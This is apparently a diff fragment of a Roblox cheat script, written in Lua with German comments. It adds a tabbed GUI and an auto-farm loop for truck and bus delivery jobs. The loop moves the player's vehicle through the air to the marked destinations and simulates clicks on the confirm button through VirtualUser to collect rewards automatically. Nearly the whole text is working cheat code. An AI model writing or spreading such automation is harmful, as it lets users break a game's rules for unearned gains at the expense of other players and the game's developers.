+			if v.Name == "SelectionBox" and v.Visible and v.Transparency ~= 1 then
+				return v.Parent.CFrame
+			end
+		end
+		for _, v in pairs(workspace.DeliveryDestinations:GetDescendants()) do
+			if v.Name == "SelectionBox" and v.Visible and v.Transparency ~= 1 then
+				return v.Parent.CFrame
+			end
+		end
+		return nil
+	end
+	
+	-- Tween-Funktion für Fahrzeugbewegung
+	local function tweenModel(model, targetCFrame, duration)
+		if FARMcurrentTween then
+			FARMcurrentTween:Cancel()
+			FARMcurrentTween = nil
+		end
+	
+		local info = TweenInfo.new(
+			duration,
+			Enum.EasingStyle.Linear,
+			Enum.EasingDirection.InOut
+		)
+	
+		local CFrameValue = Instance.new("CFrameValue")
+		CFrameValue.Value = model:GetPrimaryPartCFrame()
+	
+		CFrameValue:GetPropertyChangedSignal("Value"):Connect(function()
+			model:SetPrimaryPartCFrame(CFrameValue.Value)
+			model.PrimaryPart.Velocity = Vector3.new(0, 0, 0)
+		end)
+	
+		local tween = TweenService:Create(CFrameValue, info, { Value = targetCFrame })
+		tween:Play()
+	
+		local tweenCompleted = false
+		tween.Completed:Connect(function()
+			CFrameValue:Destroy()
+			tweenCompleted = true
+		end)
+	
+		FARMcurrentTween = tween
+	
+		repeat task.wait(0.5) until tweenCompleted or FARMstopFarm  -- Beschleunigte Wartezeit
+	
+		return tweenCompleted
+	end
+	
+	-- Fahrzeugbewegung
+	local function tweenFunction()
+		local vehicle = workspace.Vehicles:FindFirstChild(LocalPlayer.Name)
+		if not vehicle then
+			FARMLastPos = nil
+			return
+		end
+		if vehicle.PrimaryPart == nil or not vehicle.PrimaryPart then
+			vehicle.PrimaryPart = vehicle:FindFirstChild("Mass", true)
+		end
+		local _, size = vehicle:GetBoundingBox()
+	
+		if FARMPos then
+			local currentPosition = vehicle.PrimaryPart.CFrame
+			local upwardPosition = CFrame.new(currentPosition.Position.X, FARMheight, currentPosition.Position.Z)
+			if not FARMstopFarm then
+				if not tweenModel(vehicle, upwardPosition, FARMheight / FARMspeed) then return end
+			end
+	
+			if not FARMstopFarm then
+				local adjustedPosition = FARMPos * CFrame.new(0, FARMheight, 0)
+				if not tweenModel(vehicle, adjustedPosition, (adjustedPosition.Position - upwardPosition.Position).Magnitude / FARMspeed) then return end
+			end
+	
+			if not FARMstopFarm then
+				tweenModel(vehicle, (FARMPos * CFrame.new(0, size.Y / 2, 0)), FARMheight / (FARMspeed * 2))  -- Beschleunigte Abwärtsbewegung
+				if game.Players.LocalPlayer.Team == game:GetService("Teams").TruckCompany then
+					task.wait(4)  -- Kürzere Wartezeit nach dem Erreichen der Position
+					for _, v in pairs(LocalPlayer.PlayerGui:GetDescendants()) do
+						if v:IsA("ImageButton") and v.ImageColor3 == Color3.fromRGB(39, 174, 96) then
+							if v.Parent ~= nil then
+								local buttonCenter = v.AbsolutePosition + (v.AbsoluteSize / 2)
+								VirtualUser:ClickButton1(Vector2.new(buttonCenter.X, buttonCenter.Y))
+							end
+						end
+					end
+				end
+			end
+		else
+			FARMLastPos = nil
+		end
+	end
+	
+	-- RenderStepped-Loop
+	game:GetService("RunService").RenderStepped:Connect(function()
+		if autoFarmToggle == true then
+			ensurePlayerInVehicle() -- Spieler bleibt im Fahrzeug
+			if game.Players.LocalPlayer.Team == game:GetService("Teams").TruckCompany or game.Players.LocalPlayer.Team == game:GetService("Teams").BusCompany then
+				FARMPos = destination() or partfind()
+				if not FARMcooldown then
+					if not workspace.Vehicles:FindFirstChild(LocalPlayer.Name) then
+						FARMcooldown = true
+						print("Spawn Car Fist.") -- Eine einfache Ausgabe statt einer Benachrichtigung
+						task.wait(3)  -- Verkürzte Wartezeit
+						FARMcooldown = false
+						return
+					end
+					FARMcooldown = true
+					FARMPos = destination() or partfind()
+	
+					if FARMPos and (not FARMLastPos or FARMPos ~= FARMLastPos) then
+						if FARMcurrentTween then
+							FARMcurrentTween:Cancel()
+						end
+						FARMstopFarm = true
+						task.wait(0.5)  -- Kürzere Wartezeit
+						FARMstopFarm = false
+						FARMLastPos = FARMPos
+						tweenFunction()
+					end
+	
+					task.wait(0.5)  -- Verkürzte Wartezeit
+					FARMcooldown = false
+				end
+			else
+				if FARMcooldown == false then
+					FARMcooldown = true
+					print("Join Truck Or Bus Compaine.") -- Eine einfache Ausgabe
+					task.wait(3)  -- Verkürzte Wartezeit
+					FARMcooldown = false
+					return
+				end
+			end
+		end
+	end)
+	
+end
+coroutine.wrap(CWSX_fake_script)()
+local function QPXV_fake_script() -- ScreenGui.LocalScript 
+	local script = Instance.new('LocalScript', ScreenGui)
+
+	local TabButton1 = script.Parent:WaitForChild("TabButton1")
+	local TabButton2 = script.Parent:WaitForChild("TabButton2")
+	local TabButton3 = script.Parent:WaitForChild("TabButton3")
+	local TabButton4 = script.Parent:WaitForChild("TabButton4")
+	local TabButton5 = script.Parent:WaitForChild("TabButton5")
+	
+	-- Referenzen zu den Inhalten
+	local Tab1Content = script.Parent:WaitForChild("Tab1Content")
+	local Tab2Content = script.Parent:WaitForChild("Tab2Content")
+	local Tab3Content = script.Parent:WaitForChild("Tab3Content")
+	local Tab4Content = script.Parent:WaitForChild("Tab4Content")
+	local Tab5Content = script.Parent:WaitForChild("Tab5Content")
+	
+	-- Funktion zum Wechseln des Inhalts
+	local function switchTab(tabNumber)
+		-- Alle Inhalte ausblenden
+		Tab1Content.Visible = false
+		Tab2Content.Visible = false
+		Tab3Content.Visible = false
+		Tab4Content.Visible = false
+		Tab5Content.Visible = false
+	
+		-- Den entsprechenden Inhalt einblenden
+		if tabNumber == 1 then
+			Tab1Content.Visible = true
+		elseif tabNumber == 2 then
+			Tab2Content.Visible = true
+		elseif tabNumber == 3 then
+			Tab3Content.Visible = true
+		elseif tabNumber == 4 then
+			Tab4Content.Visible = true
+		elseif tabNumber == 5 then
+			Tab5Content.Visible = true
+		end
+	end
+	
+	-- Klick-Events für jeden Tab-Button
+	TabButton1.MouseButton1Click:Connect(function()
+		switchTab(1)
+	end)
+	
+	TabButton2.MouseButton1Click:Connect(function()
+		switchTab(2)
+	end)
+	
+	TabButton3.MouseButton1Click:Connect(function()
+		switchTab(3)
+	end)
+	
+	TabButton4.MouseButton1Click:Connect(function()
+		switchTab(4)
+	end)
+	
+	TabButton5.MouseButton1Click:Connect(function()
+		switchTab(5)
+	end)
+	
+	-- Standardmäßig Tab 1 sichtbar machen
+	switchTab(1)
+end
+coroutine.wrap(QPXV_fake_script)()
